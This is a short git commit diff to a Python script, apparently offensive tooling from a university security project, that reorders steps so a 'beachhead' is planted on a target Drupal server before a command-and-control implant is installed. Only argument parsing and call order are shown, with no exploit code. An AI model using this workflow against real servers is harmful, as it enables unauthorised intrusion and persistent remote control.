b8088ea682814f857b94ca94380813a2795a13c8
Jeremy Dunn <jeremydunn@umass.edu>
2023-05-10 13:05:10 -0400

    Implant beachhead before cnc

--- beachhead/Beachhead.py
+++ beachhead/Beachhead.py
@@ -25,11 +25,12 @@ def implant_cnc(ip_addr, port, path, implant_file_path):
 if __name__ == '__main__':
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument('--ip', required=True, help='IP address of the C&C server')
-    parser.add_argument('--port', required=True, help='Port of the C&C server')
-    parser.add_argument('--path', required=True, help='Path to the C&C server')
+    parser.add_argument('--ip', required=True, help='IP address of the target machine')
+    parser.add_argument('--port', required=True, help='Port of the Drupal server')
+    parser.add_argument('--path', required=True, help='Path to the Drupal server')
     parser.add_argument('--implant', required=True, help='Path to the implant file')
     args = parser.parse_args()
 
-    implant_cnc(args.ip, args.port, args.path, args.implant)
     implant_beachhead(args.ip, args.port, args.path)
+    implant_cnc(args.ip, args.port, args.path, args.implant)
+    
